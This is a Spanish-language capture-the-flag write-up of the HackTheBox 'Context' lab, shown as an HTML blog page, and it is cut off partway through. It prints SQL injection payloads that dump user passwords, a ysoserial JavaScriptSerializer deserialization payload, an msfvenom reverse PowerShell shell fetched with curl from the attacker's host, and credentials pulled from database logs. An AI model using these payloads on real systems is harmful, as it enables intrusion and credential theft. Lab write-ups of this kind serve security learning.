<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Context</title>

  <meta name="description" content="Resolución de el fortress Context de la plataforma de HackTheBox">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Context">
  <meta name="twitter:description" content="Resolución de el fortress Context de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/hackthebox/context.png">

  <meta property="og:site_name" content="xchg2pwn">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Context">
  <meta property="og:description" content="Resolución de el fortress Context de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/hackthebox/context.png">

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/context.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="canonical" href="http://localhost:4000/">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Context" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/fortresses" title="xchg2pwn" class="blog-button">Fortresses</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#flag1">But we have SSL!?</a></li>
        <li><a href="#flag2">That shouldn't be there...</a></li>
        <li><a href="#flag3">Have we met before?</a></li>
        <li><a href="#flag4">Is it a bird? Is it a plane?</a></li>
        <li><a href="#flag5">This looks bad!</a></li>
        <li><a href="#flag6">It's not a backdoor, it's a feature</a></li>
        <li><a href="#flag7">Key to the castle</a></li>
        <li><a href="#extra">Extra</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/hackthebox/context.png" style="float: right; margin-right:0px; margin-left:0px; height:70px;" class="include_image zoomable"></picture>
    <h2 class="post-title">Context</h2><br>
  </header>
  
<section class="post" id="flag1">
<br><h3 class="post-title">But we have SSL!?</h3>
<h4 class="post-title">CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}</h4><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, y al lanzar algunos <code class="language-plaintext highlighter-rouge">scripts</code> de propios nmap mssql nos muestra el nombre del equipo y al <code class="language-plaintext highlighter-rouge">dominio</code> que pertenece</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ nmap </span><span class="p">10.13.37.12 -Pn -sCV
Nmap scan report for 10.13.37.12  
PORT     STATE SERVICE
443/tcp  open  https
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   10.13.37.12:1433: 
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server
5985/tcp open  wsman</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos el puerto <code class="language-plaintext highlighter-rouge">443</code> abierto, esta corriendo un servicio <code class="language-plaintext highlighter-rouge">https</code>, en el navegador podemos ver una pagina <code class="language-plaintext highlighter-rouge">web</code> bastante simple aunque con varias pestañas en ella</p>
<a href="/fortresses/context/1.png" target="_blank"><div><p><img src="/fortresses/context/1.png"></p></div></a>   

<p class="plain-text">Podemos ver una pestaña <code class="language-plaintext highlighter-rouge">Staff</code> que realmente solo nos muestra algunos <code class="language-plaintext highlighter-rouge">usuarios</code></p>
<a href="/fortresses/context/2.png" target="_blank"><div><p><img src="/fortresses/context/2.png"></p></div></a>

<p class="plain-text">Al mirar el <code class="language-plaintext highlighter-rouge">codigo</code> fuente podemos ver directamente la primera <code class="language-plaintext highlighter-rouge">flag</code>, ademas nos estan mostrando <code class="language-plaintext highlighter-rouge">credenciales</code> validas para el portal de admin, <code class="language-plaintext highlighter-rouge">jay.teignton:admin</code></p>
<a href="/fortresses/context/3.png" target="_blank"><div><p><img src="/fortresses/context/3.png"></p></div></a>
</section>

<section class="post" id="flag2">
<br><h3 class="post-title">That shouldn't be there...</h3>
<h4 class="post-title">CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}</h4><br>

<p class="plain-text">En <code class="language-plaintext highlighter-rouge">/Admin</code> podemos iniciar sesión con las <code class="language-plaintext highlighter-rouge">credenciales</code> encontradas en el codigo</p>
<a href="/fortresses/context/4.png" target="_blank"><div><p><img src="/fortresses/context/4.png"></p></div></a>

<p class="plain-text">Ahora encontramos una pestaña con el nombre <code class="language-plaintext highlighter-rouge">Management</code> en donde encontramos una tabla con varios <code class="language-plaintext highlighter-rouge">productos</code> y tenemos la posibilidad de <code class="language-plaintext highlighter-rouge">agregar</code> uno nuevo</p>
<a href="/fortresses/context/5.png" target="_blank"><div><p><img src="/fortresses/context/5.png"></p></div></a>

<p class="plain-text">Despues de buscar un rato encontramos una <code class="language-plaintext highlighter-rouge">inyeccion sql</code>, iniciamos enumerando el nombre de la <code class="language-plaintext highlighter-rouge">base de datos</code> actualmente en uso, nos devuelve <code class="language-plaintext highlighter-rouge">webapp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">'+(select db_name())+'  </span>
</code></pre></div></div><br>
<a href="/fortresses/context/6.png" target="_blank"><div><p><img src="/fortresses/context/6.png"></p></div></a>

<p class="plain-text">Enumerando las los objetos de <code class="language-plaintext highlighter-rouge">webapp</code> especificamente que sean del tipo <code class="language-plaintext highlighter-rouge">tablas</code> podemos encontrar una llamada <code class="language-plaintext highlighter-rouge">users</code> que generalmente contiene credenciales</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'  </span>
</code></pre></div></div><br>
<a href="/fortresses/context/7.png" target="_blank"><div><p><img src="/fortresses/context/7.png"></p></div></a>

<p class="plain-text">Al leer el campo <code class="language-plaintext highlighter-rouge">username</code> de la tabla users nos devuelve el usuario <code class="language-plaintext highlighter-rouge">abbie.buckfast</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">'+(select top 1 username from users order by username)+'  </span>
</code></pre></div></div><br>
<a href="/fortresses/context/8.png" target="_blank"><div><p><img src="/fortresses/context/8.png"></p></div></a>

<p class="plain-text">Hacemos lo mismo con el campo <code class="language-plaintext highlighter-rouge">password</code> y ahora nos devuelve <code class="language-plaintext highlighter-rouge">AMkru$3_f'/Q^7f?</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">'+(select top 1 password from users order by username)+'  </span>
</code></pre></div></div><br>
<a href="/fortresses/context/9.png" target="_blank"><div><p><img src="/fortresses/context/9.png"></p></div></a>

<p class="plain-text">Además de credenciales que encontramos tambien podemos encontrar la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'  </span>
</code></pre></div></div><br>
<a href="/fortresses/context/10.png" target="_blank"><div><p><img src="/fortresses/context/10.png"></p></div></a>
</section>

<section class="post" id="flag3">
<br><h3 class="post-title">Have we met before?</h3>
<h4 class="post-title">CONTEXT{wh00000_4re_y0u?}</h4><br>

<p class="plain-text">Aplicando un poco de fuerza bruta hacia la web nos encontramos entre otros con un directorio <code class="language-plaintext highlighter-rouge">/owa</code> que devuelve nos un codigo de estado <code class="language-plaintext highlighter-rouge">302</code> redirect</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.13.37.12/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.13.37.12/FUZZ
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000003:   </span><span class="ve">200</span><span class="p">        81 L     196 W      2879 Ch     "admin"       
000000077:   </span><span class="ro">401</span><span class="p">        0 L      0 W        0 Ch        "api"         
000000127:   </span><span class="ve">200</span><span class="p">        78 L     232 W      2548 Ch     "home"        
000001936:   </span><span class="ro">401</span><span class="p">        0 L      0 W        0 Ch        "rpc"         
000008263:   </span><span class="az">302</span><span class="p">        3 L      8 W        205 Ch      "owa"         
000005512:   </span><span class="ro">403</span><span class="p">        0 L      0 W        0 Ch        "sapi"        
000014447:   </span><span class="ro">401</span><span class="p">        0 L      0 W        0 Ch        "autodiscover"
000015098:   </span><span class="az">302</span><span class="p">        3 L      8 W        205 Ch      "ecp"         
000020796:   </span><span class="ro">401</span><span class="p">        0 L      0 W        0 Ch        "ews"</span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir <code class="language-plaintext highlighter-rouge">/owa</code> en la web podemos ver un panel de <code class="language-plaintext highlighter-rouge">login</code> para Outlook Web Access</p>
<a href="/fortresses/context/11.png" target="_blank"><div><p><img src="/fortresses/context/11.png"></p></div></a>

<p class="plain-text">Podemos iniciar sesión con las <code class="language-plaintext highlighter-rouge">credenciales</code> que hemos conseguido a traves de la <code class="language-plaintext highlighter-rouge">sql injection</code>, las cuales son las siguientes <code class="language-plaintext highlighter-rouge">abbie.buckfast:AMkru$3_f'/Q^7f?</code></p>
<a href="/fortresses/context/12.png" target="_blank"><div><p><img src="/fortresses/context/12.png"></p></div></a>

<p class="plain-text">Son válidas y conseguimos acceso aunque no tenemos ningun <code class="language-plaintext highlighter-rouge">correo</code> pendiente, sin embargo tenemos una pestaña donde podemos abrir el <code class="language-plaintext highlighter-rouge">email</code> de otro <code class="language-plaintext highlighter-rouge">usuario</code></p>
<a href="/fortresses/context/13.png" target="_blank"><div><p><img src="/fortresses/context/13.png"></p></div></a>

<p class="plain-text">Uno de los <code class="language-plaintext highlighter-rouge">usuarios</code> encontrados en el panel del inicio fue el usuario <code class="language-plaintext highlighter-rouge">jay.teignton</code> el cual tiene un <code class="language-plaintext highlighter-rouge">email</code> al cual podemos cambiar y leer todos sus <code class="language-plaintext highlighter-rouge">correos</code></p>
<a href="/fortresses/context/14.png" target="_blank"><div><p><img src="/fortresses/context/14.png"></p></div></a>

<p class="plain-text">En los correos <code class="language-plaintext highlighter-rouge">enviados</code> encontramos la <code class="language-plaintext highlighter-rouge">flag</code> en un correo que el usuario <code class="language-plaintext highlighter-rouge">jay.teignton</code> ha enviado a el usuario <code class="language-plaintext highlighter-rouge">andy.teignton</code> con el asunto <code class="language-plaintext highlighter-rouge">flag.txt</code></p>
<a href="/fortresses/context/15.png" target="_blank"><div><p><img src="/fortresses/context/15.png"></p></div></a>
</section>

<section class="post" id="flag4">
<br><h3 class="post-title">Is it a bird? Is it a plane?</h3>
<h4 class="post-title">CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}</h4><br>

<p class="plain-text">En lo <code class="language-plaintext highlighter-rouge">correos</code> recibidos tenemos uno de <code class="language-plaintext highlighter-rouge">karl.memaybe</code> el cual nos dice que hubo un hackeo, ademas este nos comparte un <code class="language-plaintext highlighter-rouge">zip</code> con el <code class="language-plaintext highlighter-rouge">codigo fuente</code> del proyecto</p>
<a href="/fortresses/context/16.png" target="_blank"><div><p><img src="/fortresses/context/16.png"></p></div></a>

<p class="plain-text">Analizando el <code class="language-plaintext highlighter-rouge">codigo</code> encontramos que este toma el valor de la cookie <code class="language-plaintext highlighter-rouge">Profile</code>, decodea su valor de <code class="language-plaintext highlighter-rouge">base64</code> y usa <code class="language-plaintext highlighter-rouge">JavaScriptSerializer</code> para deserializarla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="c1">WebApplication/Views/Admin </span><span class="ve">❯ cat</span><span class="p"> _ViewStart.cshtml
@{
    Layout </span><span class="o">= </span><span class="s">"~/Views/Shared/_Layout.cshtml"</span><span class="p">;
}

</span><span class="na">@using </span><span class="p">System.Text;
</span><span class="na">@using </span><span class="p">System.Web.Script.Serialization;
@{ 
    </span><span class="o">if</span><span class="p"> (</span><span class="mi">0 </span><span class="o">!= </span><span class="p">Context.Session.Keys.Count) {
        </span><span class="o">if</span><span class="p"> (</span><span class="mi">null</span><span class="o"> != </span><span class="p">Context.Request.Cookies.Get(</span><span class="s">"Profile"</span><span class="p">)) {
            try {
                </span><span class="no">byte</span><span class="p">[] data </span><span class="o">= </span><span class="p">Convert.FromBase64String(Context.Request.Cookies.Get(</span><span class="s">"Profile"</span><span class="p">)?.Value);  
                </span><span class="no">string </span><span class="p">str </span><span class="o">= </span><span class="p">UTF8Encoding.UTF8.GetString(data);

                </span><span class="na">SimpleTypeResolver </span><span class="p">resolver </span><span class="o">= new </span><span class="p"></span><span class="na">SimpleTypeResolver</span><span class="p">();
                </span><span class="na">JavaScriptSerializer </span><span class="p">serializer </span><span class="o">= new </span><span class="na">JavaScriptSerializer</span><span class="p">(resolver);

                </span><span class="no">object </span><span class="p">obj </span><span class="o">=</span><span class="p"> (serializer.Deserialize(str, </span><span class="o">typeof</span><span class="p">(</span><span class="no">object</span><span class="p">)) </span><span class="o">as </span><span class="na">Profile</span><span class="p">);
                </span><span class="c1">// TODO: create profile to change the language and font of the website </span><span class="p">
            } </span><span class="o">catch </span><span class="p">(</span><span class="na">Exception </span><span class="p">e) {
            }
        }
    }
}</span>
</code></pre></div></div><br>

<p class="plain-text">Esto es vulnerable a un ataque de <code class="language-plaintext highlighter-rouge">deserialización</code>, podemos iniciar creando un archivo <code class="language-plaintext highlighter-rouge">exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code> que se encargara de enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code> ahora despues de crearlo lo compartimos a traves de un servidor <code class="language-plaintext highlighter-rouge">http</code> creado con <code class="language-plaintext highlighter-rouge">python</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1893 bytes
Final size of exe file: 8192 bytes
Saved as: shell.exe

</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
</code></pre></div></div><br>

<p class="plain-text">En un <code class="language-plaintext highlighter-rouge">windows</code> con <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a> creamos un payload en <code class="language-plaintext highlighter-rouge">base64</code> indicando el formato <code class="language-plaintext highlighter-rouge">JavaScriptSerializer</code> con su respectivo gadget, el cual hara un <code class="language-plaintext highlighter-rouge">curl</code> a nuestro servidor y descargara el archivo <code class="language-plaintext highlighter-rouge">shell.exe</code> en el directorio <code class="language-plaintext highlighter-rouge">C:\ProgramData</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\CTF\ysoserial&gt; </span><span class="am">.\ysoserial.exe</span><span class="c1"> -f </span><span class="p">JavaScriptSerializer </span><span class="c1">-o </span><span class="p">base64 </span><span class="c1">-g </span><span class="p">ObjectDataProvider </span><span class="c1">-c </span><span class="az">"cmd /c curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe"</span><span class="p">
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNC4xMC9zaGVsbC5leGUgLW8gQzpcXFByb2dyYW1EYXRhXFxzaGVsbC5leGUnDQogICAgICAgIH0NCiAgICB9DQp9  
PS C:\CTF\ysoserial&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en la web principal creamos una <code class="language-plaintext highlighter-rouge">cookie</code> con el nombre <code class="language-plaintext highlighter-rouge">Profile</code> donde como valor le pasaremos todo nuestro <code class="language-plaintext highlighter-rouge">payload</code> serializado y encodeado en <code class="language-plaintext highlighter-rouge">base64</code></p>
<a href="/fortresses/context/17.png" target="_blank"><div><p><img src="/fortresses/context/17.png"></p></div></a>

<p class="plain-text">Al <code class="language-plaintext highlighter-rouge">recargar</code> la pagina recibimos una petición al archivo <code class="language-plaintext highlighter-rouge">shell.exe</code> esto significa que se ha ejecutado el <code class="language-plaintext highlighter-rouge">comando</code> y ha descargado el archivo exe que hemos creado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.37.12 - - "GET /shell.exe HTTP/1.1" 200 -</span>
</code></pre></div></div><br>

<p class="plain-text">Creamos un nuevo payload el cual solo ejecutara el archivo exe ya descargado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\CTF\ysoserial&gt; </span><span class="am">.\ysoserial.exe</span><span class="c1"> -f </span><span class="p">JavaScriptSerializer </span><span class="c1">-o </span><span class="p">base64 </span><span class="c1">-g </span><span class="p">ObjectDataProvider </span><span class="c1">-c </span><span class="az">"cmd /c C:\ProgramData\shell.exe"</span><span class="p">
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxzaGVsbC5leGUnDQogICAgICAgIH0NCiAgICB9DQp9  
PS C:\CTF\ysoserial&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Cambiamos el <code class="language-plaintext highlighter-rouge">payload</code> y al recargar la página de nuevo esta vez se ejecuta el <code class="language-plaintext highlighter-rouge">exe</code> y recibimos una <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">web_user</code> en la máquina victima</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.12
Windows PowerShell running as user web_user on WEB
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32&gt; </span><span class="am">whoami</span><span class="p">
teignton\web_user
PS C:\Windows\system32&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">En el directorio de <code class="language-plaintext highlighter-rouge">Public</code> dentro de <code class="language-plaintext highlighter-rouge">Users</code> podemos encontrar y leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Public&gt; </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\Public 

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       12/10/2020     14:33                Documents
d-r---       15/09/2018     08:19                Downloads  
d-r---       15/09/2018     08:19                Music
d-r---       15/09/2018     08:19                Pictures
d-r---       15/09/2018     08:19                Videos
-a----       15/07/2020     20:45             46 flag.txt

PS C:\Users\Public&gt; </span><span class="am">type </span><span class="p">flag.txt   
CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8} 
PS C:\Users\Public&gt;</span>
</code></pre></div></div><br>
</section>

<section class="post" id="flag5">
<br><h3 class="post-title">This looks bad!</h3>
<h4 class="post-title">CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}</h4><br>

<p class="plain-text">En <code class="language-plaintext highlighter-rouge">C:\</code> encontramos un directorio <code class="language-plaintext highlighter-rouge">Logs</code> que dentro tiene un directorio <code class="language-plaintext highlighter-rouge">WEBDB</code> que dentro tiene varios archivos de <code class="language-plaintext highlighter-rouge">log</code> probablemente de la base de datos de la web</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\&gt; </span><span class="am">dir </span><span class="p">

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/10/2020     23:14                9624b4180591c9eb43d11878de360a
d-r---       12/10/2020     18:59                Clients
d-----       02/06/2022     12:10                ExchangeSetupLogs
d-----       12/10/2020     15:44                inetpub
d-----       12/10/2020     18:45                Logs
d-----       12/10/2020     15:15                PerfLogs
d-r---       14/10/2020     17:19                Program Files
d-----       12/10/2020     19:31                Program Files (x86)
d-----       13/10/2020     00:40                root
d-----       12/10/2020     15:43                SQL2019
d-----       17/04/2023     17:24                tmp
d-r---       12/10/2020     19:31                Users
d-----       14/10/2020     11:55                Windows
-a----       14/04/2023     17:41             29 BitlockerActiveMonitoringLogs

PS C:\&gt; </span><span class="am">cd </span><span class="p">Logs

PS C:\Logs&gt; </span><span class="am">dir</span><span class="p">

    Directory: C:\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/10/2020     18:45                W3SVC1
d-----       12/10/2020     18:45                WEBDB

PS C:\Logs&gt; </span><span class="am">cd </span><span class="p">WEBDB

PS C:\Logs\WEBDB&gt; </span><span class="am">dir</span><span class="p">

    Directory: C:\Logs\WEBDB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       30/04/2020     15:42          16962 ERRORLOG
-a----       30/04/2020     15:41          38740 ERRORLOG.1
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688578520000.xel
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688633370000.xel
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688733830000.xel
-a----       27/04/2020     14:57          70144 HkEngineEventFile_0_132324694642170000.xel
-a----       27/04/2020     15:09          70144 HkEngineEventFile_0_132324701496760000.xel
-a----       28/04/2020     11:11          70144 HkEngineEventFile_0_132325422936270000.xel
-a----       29/04/2020     15:23          70144 HkEngineEventFile_0_132326437911670000.xel
-a----       29/04/2020     16:04          70144 HkEngineEventFile_0_132326462946300000.xel
-a----       29/04/2020     16:08          70144 HkEngineEventFile_0_132326464955870000.xel
-a----       30/04/2020     09:55          70144 HkEngineEventFile_0_132327105065260000.xel
-a----       30/04/2020     10:15          70144 HkEngineEventFile_0_132327117227960000.xel
-a----       30/04/2020     10:56          70144 HkEngineEventFile_0_132327142045910000.xel
-a----       30/04/2020     12:33          70144 HkEngineEventFile_0_132327199844110000.xel
-a----       30/04/2020     14:45          70144 HkEngineEventFile_0_132327279504690000.xel
-a----       30/04/2020     15:41          70144 HkEngineEventFile_0_132327312839890000.xel  
-a----       30/04/2020     10:55        1048576 log_10.trc
-a----       30/04/2020     11:34        1048576 log_11.trc
-a----       30/04/2020     14:45        1048576 log_12.trc
-a----       30/04/2020     15:41        1048576 log_13.trc
-a----       30/04/2020     15:41           2560 log_14.trc
-a----       30/04/2020     11:34         130048 system_health_0_132327142055920000.xel
-a----       30/04/2020     14:45         160768 system_health_0_132327199872080000.xel
-a----       30/04/2020     15:41         131072 system_health_0_132327279509840000.xel
-a----       30/04/2020     15:41          98816 system_health_0_132327312844270000.xel

PS C:\Logs\WEBDB&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">En un log podemos encontrar <code class="language-plaintext highlighter-rouge">credenciales</code> probablemente validas para la <code class="language-plaintext highlighter-rouge">db</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Logs\WEBDB&gt; </span><span class="am">type </span><span class="p">log_13.trc | </span><span class="am">Select-String </span><span class="p">TEIGNTON

????????? ??? ?????? ?????????? ??????? TEIGNTON\karl.memaybe  
????????? ??? ?????? ?????????? ??????? B6rQx_d&amp;RVqvcv2A

PS C:\Logs\WEBDB&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">1433</code> esta abierto asi que podemos conectarnos con <code class="language-plaintext highlighter-rouge">mssqlclient</code>, asi podemos comprobar que las <code class="language-plaintext highlighter-rouge">credenciales</code> que conseguimos son <code class="language-plaintext highlighter-rouge">validas</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-mssqlclient </span><span class="p">teignton.htb/karl.memaybe:</span><span class="am">'B6rQx_d&amp;RVqvcv2A'</span><span class="p">@10.13.37.12 -windows-auth  
